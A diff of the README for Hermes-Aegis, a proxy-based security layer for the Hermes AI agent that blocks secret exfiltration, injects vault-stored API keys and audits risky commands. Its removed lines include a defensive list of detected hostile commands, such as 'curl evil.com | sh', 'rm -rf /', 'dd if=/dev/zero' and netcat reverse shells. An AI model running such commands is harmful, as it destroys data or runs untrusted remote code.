@@ -1,8 +1,8 @@
-# Hermes-Aegis 🛡️
+# Hermes-Aegis
 
-**Security hardening layer for Hermes Agent** - Prevents secret leakage, dangerous command execution, and unauthorized data exfiltration through infrastructure-level isolation and intelligent monitoring.
+**Security hardening layer for Hermes Agent** — Prevents secret leakage, dangerous command execution, and unauthorized data exfiltration through proxy-based monitoring.
 
-[![Tests](https://img.shields.io/badge/tests-330%20passing-brightgreen)]()
+[![Tests](https://img.shields.io/badge/tests-314%20passing-brightgreen)]()
 [![Python](https://img.shields.io/badge/python-3.11%2B-blue)]()
 [![License](https://img.shields.io/badge/license-MIT-blue)]()
 
@@ -10,207 +10,114 @@
 
 ## What It Does
 
-Hermes-Aegis wraps your AI agent with **multi-layered security**:
+Hermes-Aegis wraps Hermes Agent with a transparent MITM proxy that:
 
-✅ **Secret Protection** - Blocks API keys and credentials in HTTP requests, subprocess output, and file writes
-✅ **Dangerous Command Detection** - Identifies risky patterns like `curl | sh`, `rm -rf`, SQL injection  
-✅ **Network Isolation** - Container-based sandboxing with MITM proxy (Tier 2)  
-✅ **Audit Trail** - Tamper-proof log of all security events  
-✅ **Rate Limiting** - Detects suspicious burst patterns (data tunneling)  
-✅ **Domain Allowlist** - Optional restriction of outbound connections  
+- **Blocks secret exfiltration** — scans all outbound HTTP for API keys, tokens, credentials
+- **Injects API keys** — secrets stay in your encrypted vault, never in agent memory
+- **Detects dangerous commands** — 40+ risky patterns (shell injection, destructive ops, privesc)
+- **Rate-limits bursts** — detects suspicious data tunneling patterns
+- **Restricts domains** — optional allowlist for outbound connections
+- **Audit trail** — tamper-proof hash-chained log of all security events
 
-**All protection is active by default** - zero configuration required!
+---
+
+## Prerequisites
+
+- **Python 3.11+**
+- **Hermes Agent** installed at `~/.hermes/` (with `config.yaml`)
+- **uv** package manager (recommended) or pip
+- **Docker** (optional — for container isolation)
 
 ---
 
 ## Quick Start
 
-**👉 See [QUICK_START.md](QUICK_START.md) for immediate MVP testing!**
-
-### Installation (One Command)
-
 ```bash
-cd ~/Projects/hermes-aegis
-./install.sh
+# 1. Install hermes-aegis (global — available from any terminal)
+uv tool install hermes-aegis
+# Or from source:
+uv tool install -e ~/Projects/hermes-aegis
+
+# 2. Set up vault (one-time — auto-migrates keys from ~/.hermes/.env)
+hermes-aegis setup
+
+# 3. Install Hermes hook (also configures Docker support)
+hermes-aegis install
+
+# 4. Verify it works
+hermes-aegis test
+
+# 5. Run Hermes with aegis protection
+hermes-aegis run
 ```
 
-This will:
-1. Install the Python package
-2. Configure your shell
-3. Initialize the vault
-4. Patch Hermes to show Aegis status
-5. Verify everything works
+> **Note:** `hermes-aegis setup` automatically migrates API keys from `~/.hermes/.env` into the encrypted vault. If you don't have a `.env` file (or want to add more keys later), use `hermes-aegis vault set KEY_NAME`. Security scanning works without any vault keys — only API key injection requires them.
 
-### Verify It's Working
+### Auto-Injected API Keys (Optional)
 
-Open a new terminal and run:
-```bash
-hermes
-```
+If your vault has any of these keys, the proxy automatically injects them into LLM provider requests — they never touch Hermes's memory or `~/.hermes/.env`:
 
-You should see in the banner:
-```
-Session: <timestamp>
-Security: Aegis Tier 1 🛡️  <-- Confirms Aegis is active!
-```
+| Key | Provider |
+|-----|----------|
+| `OPENAI_API_KEY` | OpenAI |
+| `ANTHROPIC_API_KEY` | Anthropic |
+| `GOOGLE_API_KEY` | Google AI |
+| `GROQ_API_KEY` | Groq |
+| `TOGETHER_API_KEY` | Together AI |
+| `OPENROUTER_API_KEY` | OpenRouter |
 
-### Essential Config
+Add any key with `hermes-aegis vault set KEY_NAME` — you'll be prompted for the value.
 
-**REQUIRED**: Set Hermes to use Aegis backend
+> **How Hermes sees your keys:** When you run `hermes-aegis run`, placeholder values (`aegis-managed`) are set as environment variables so Hermes passes its startup check. The proxy then injects real keys at the HTTP level. Your `~/.hermes/.env` file is never modified.
 
-Edit `~/.hermes/config.yaml`:
-```yaml
-terminal:
-  backend: aegis  # MUST be "aegis", not "local"
-```
+### How It Works
 
-**Tier Selection (Automatic):**
+1. `hermes-aegis run` starts the mitmproxy-based security proxy
+2. Sets `HTTP_PROXY`/`HTTPS_PROXY` env vars so all traffic routes through the proxy
+3. Sets placeholder API keys (`aegis-managed`) that satisfy Hermes's startup check
+4. Runs `hermes` as a child process — all subprocess calls inherit the proxy env vars
+5. Proxy scans for secrets, blocks exfiltration, injects real API keys from the vault
+6. When Hermes exits, the proxy is stopped automatically
 
-Aegis respects your Hermes backend setting:
-- **`backend: local`** (default) → Aegis Tier 1 (in-process protection)
-- **`backend: docker`** → Aegis Tier 2 (container isolation + Tier 1 features)
-- **`backend: ssh/modal/etc`** → Aegis Tier 1
-
-**Want maximum security?** Just change your Hermes config to `backend: docker` and run `hermes-aegis setup` to build the image. That's it!
-
-Check your tier: `hermes-aegis status`
-
----
-
-## Features
-
-### 🔐 Secret Scanning (Active by Default)
-
-**Outbound HTTP Monitoring**
-- Scans all HTTP requests for secrets before they leave your machine
-- Blocks requests containing API keys, tokens, or credentials
-- Works with Tier 1 (urllib3 monkey-patch) and Tier 2 (MITM proxy)
-
-**Output Redaction**
-- Scans subprocess stdout/stderr for secrets
-- Redacts matches before output reaches the LLM
-- Prevents accidental leakage through command output
-
-**File Write Monitoring**
-- Watches files written to `/workspace` for secrets
-- Warns when credentials are written to disk
-- Logs violations to audit trail
-
-### ⚠️ Dangerous Command Detection (Audit by Default)
-
-Detects 40+ risky patterns:
-- Shell injection: `curl evil.com | sh`
-- Destructive: `rm -rf /`, `dd if=/dev/zero`
-- Privilege escalation: `chmod 777`, `chown root`
-- Data exfiltration: `nc -l`, reverse shells
-- Code evaluation: `eval()`, `exec()`
-
-**Configurable:**
-```bash
-# View current mode
-hermes-aegis config get dangerous_commands
-
-# Enable blocking mode
-hermes-aegis config set dangerous_commands block
-```
-
-### 🌐 Network Rate Limiting (Active by Default)
-
-- Tracks requests per host with sliding window
-- Default: 50 requests / 1 second threshold
-- Logs anomalies for review (detection-only)
-- Adjustable: `hermes-aegis config set rate_limit_requests 30`
-
-### 🚪 Domain Allowlist (Optional)
-
-Restrict outbound connections:
-
-```bash
-# Empty allowlist = allow all (default)
-hermes-aegis allowlist list
-
-# Add domains to restrict
-hermes-aegis allowlist add api.openai.com
-hermes-aegis allowlist add api.anthropic.com
-
-# Now ONLY these domains are allowed
-```
-
-### 📊 Audit Trail
-
-Tamper-proof log of all security events:
-
-```bash
-# View recent events
-hermes-aegis audit tail
-
-# Verify integrity
-hermes-aegis audit verify
-
-# Export for analysis
-hermes-aegis audit export --format json > audit.json
-```
-
----
-
-## Architecture
-
-### Tier 1: In-Process Protection
-- urllib3 HTTP scanning (monkey-patch)
-- File write monitoring (builtins.open patch)
-- Middleware chain (output scanning, dangerous command detection)
-- Works without Docker
-
-### Tier 2: Container Isolation
-- Hardened Docker container (read-only filesystem, no capabilities)
-- Internal network isolation
-- MITM proxy on host for LLM API access
-- API key injection (secrets never enter container)
-- Resource limits (512MB RAM, 50% CPU)
-
-Tier 2 auto-activates when Docker is available.
+No monkey-patching. No shell modifications. No file modifications. Just a proxy.
 
 ---
 
 ## CLI Reference
 
-### Status & Info
 ```bash
-hermes-aegis status              # Check tier, vault, Docker
-hermes-aegis --help              # Show all commands
-```
+# Lifecycle
+hermes-aegis run                 # Run Hermes with aegis protection
+hermes-aegis run -- gateway      # Run Hermes gateway with protection
+hermes-aegis install             # Install Hermes hook + generate CA cert
+hermes-aegis uninstall           # Remove Hermes hook
+hermes-aegis start               # Start proxy manually
+hermes-aegis stop                # Stop proxy
+hermes-aegis status              # Show proxy, hook, vault, Docker status
+hermes-aegis test                # Verify proxy blocks secrets (canary test)
 
-### Vault (Encrypted Secrets)
-```bash
+# Setup
+hermes-aegis setup               # One-time vault init + optional Docker image build
+
+# Vault (Encrypted Secrets)
 hermes-aegis vault list          # List secret keys
-hermes-aegis vault set KEY val   # Store secret
-hermes-aegis vault get KEY       # Retrieve secret
+hermes-aegis vault set KEY       # Store secret (prompted)
 hermes-aegis vault remove KEY    # Delete secret
-```
 
-### Configuration
-```bash
-hermes-aegis config get [key]        # View settings
-hermes-aegis config set KEY value    # Update setting
+# Configuration
+hermes-aegis config get [key]    # View settings
+hermes-aegis config set KEY val  # Update setting
+# Settings: dangerous_commands (audit|block), rate_limit_requests, rate_limit_window
 
-# Settings:
-#   dangerous_commands: audit | block
-#   rate_limit_requests: <number>
-#   rate_limit_window: <seconds>
-```
+# Domain Allowlist
+hermes-aegis allowlist list      # Show allowed domains
+hermes-aegis allowlist add DOM   # Add domain
+hermes-aegis allowlist remove DOM # Remove domain
 
-### Domain Allowlist
-```bash
-hermes-aegis allowlist list          # Show allowed domains
-hermes-aegis allowlist add DOMAIN    # Add domain
-hermes-aegis allowlist remove DOMAIN # Remove domain
-```
-
-### Audit Trail
-```bash
-hermes-aegis audit tail          # Recent events
+# Audit Trail
+hermes-aegis audit show          # Recent events (last 20)
+hermes-aegis audit show --all    # All events
 hermes-aegis audit verify        # Check integrity
-hermes-aegis audit export        # Export log
 ```
 
 ---
@@ -224,115 +131,69 @@ All stored in `~/.hermes-aegis/`:
 ├── vault.enc                 # Encrypted secrets (Fernet AES)
 ├── config.json               # Security settings
 ├── domain-allowlist.json     # Allowed domains
-└── audit.log                 # Tamper-proof event log
+├── audit.jsonl               # Tamper-proof event log
+├── proxy.pid                 # Running proxy PID + port
+└── proxy-config.json         # Proxy startup config (secrets deleted after read)
 ```
 
 ---
 
 ## Development
 
-### Run Tests
 ```bash
-cd ~/Projects/hermes-aegis
-uv run pytest tests/ -v
-
-# Expected: 330 passed, 2 skipped
+uv run pytest tests/ -q          # Run all tests (314 passing)
+uv run pytest tests/security/ -v # Security tests only
 ```
 
 ### Project Structure
+
 ```
 src/hermes_aegis/
-├── integration.py          # Hermes backend registration
-├── environment.py          # AegisEnvironment wrapper
-├── tier1/                  # In-process protection
-│   ├── scanner.py          # HTTP monitoring
-│   └── file_scanner.py     # File write monitoring
-├── tier2/                  # Container isolation (future)
-├── proxy/                  # MITM proxy (Tier 2)
-│   ├── addon.py            # ArmorAddon (inject keys, scan)
-│   └── runner.py           # Proxy lifecycle
-├── middleware/             # Security middleware
-│   ├── chain.py            # Middleware architecture
-│   ├── output_scanner.py   # Output redaction
-│   └── dangerous_blocker.py # Command blocking
-├── patterns/               # Detection patterns
-│   ├── secrets.py          # Secret patterns
-│   ├── dangerous.py        # Dangerous commands
-│   └── crypto.py           # Crypto key patterns
-├── vault/                  # Encrypted storage
-│   └── store.py            # VaultStore
-├── config/                 # Configuration
-│   ├── allowlist.py        # Domain allowlist
-│   └── settings.py         # Persistent settings
-└── audit/                  # Audit trail
-    └── trail.py            # Hash-chained log
+├── cli.py                 # CLI commands
+├── hook.py                # Hermes hook installer + old setup migration
+├── utils.py               # Shared utilities (port finding, docker check, etc.)
+├── proxy/
+│   ├── addon.py           # AegisAddon (inject keys, scan, rate limit)
+│   ├── entry.py           # mitmproxy entry script
+│   ├── runner.py          # Proxy lifecycle (start/stop/is_running)
+│   ├── server.py          # ContentScanner
+│   └── injector.py        # API key injection logic
+├── patterns/              # Detection patterns
+│   ├── secrets.py         # API key / credential patterns
+│   ├── dangerous.py       # Dangerous command patterns
+│   └── crypto.py          # Crypto wallet patterns
+├── middleware/             # Security middleware chain
+├── vault/                 # Encrypted secret storage
+├── config/                # Settings + domain allowlist
+├── audit/                 # Hash-chained audit trail
+└── container/             # Docker builder/runner (optional)
 ```
 
 ---
 
-## Documentation
+## Troubleshooting
 
-- [Installation Guide](INSTALLATION.md) - Detailed setup instructions
-- [User Setup Guide](USER_SETUP_GUIDE.md) - Usage and configuration
-- [Simple Install](INSTALL_SIMPLE.md) - Non-technical users
-- [Phase 2 Complete](PHASE2_COMPLETE.md) - Feature implementation details
-- [Task Status](TASKS.md) - Development roadmap
+**"Hermes Agent not found"** when running `hermes-aegis install`
+- Hermes must be installed at `~/.hermes/` with a `config.yaml`. Install Hermes first.
 
----
+**"CA certificate not found"** or HTTPS errors
+- Run `hermes-aegis install` again — it generates the mitmproxy CA cert automatically.
+- If mitmproxy isn't installed: `uv pip install 'mitmproxy>=10.0'`
 
-## Requirements
+**Proxy not starting**
+- Check status: `hermes-aegis status`
+- Check if port is in use: `hermes-aegis start` will auto-find an available port (8443-8500)
+- Check audit log: `hermes-aegis audit show`
 
-- Python 3.11+
-- Hermes Agent v0.2.0+
-- Docker (optional, for Tier 2)
+**API calls failing through proxy**
+- Verify vault has the right keys: `hermes-aegis vault list`
+- Ensure CA cert env vars are set (the hook does this automatically)
 
----
-
-## Threat Model
-
-**What Aegis Protects Against:**
-- ✅ Accidental secret leakage via HTTP requests
-- ✅ Secrets in subprocess output/logs
-- ✅ Credential theft via command injection
-- ✅ Data exfiltration through network tunneling
-- ✅ Dangerous command execution
-- ✅ File-based secret leakage
-
-**What Aegis Does NOT Protect Against:**
-- ❌ Malicious model weights
-- ❌ Prompt injection attacks (use separate guardrails)
-- ❌ Root-level system compromise
-- ❌ Raw socket access (bypasses urllib3)
-
-Aegis provides **infrastructure-level protection** - pair it with prompt guardrails and model alignment for complete security.
+**Want to verify it works?**
+- Run `hermes-aegis test-canary` to send a canary secret through the proxy and confirm it gets blocked.
 
 ---
 
 ## License
 
-MIT License - See [LICENSE](LICENSE) for details.
-
----
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Citation
-
-If you use Hermes-Aegis in research or production:
-
-```bibtex
-@software{hermes_aegis_2026,
-  title = {Hermes-Aegis: Security Hardening for AI Agents},
-  author = {Your Name},
-  year = {2026},
-  url = {https://github.com/YOUR_USERNAME/hermes-aegis}
-}
-```
-
----
-
-**Built with 🌙 for liberation, privacy, and anti-authoritarian tools.**
+MIT License — See [LICENSE](LICENSE) for details.
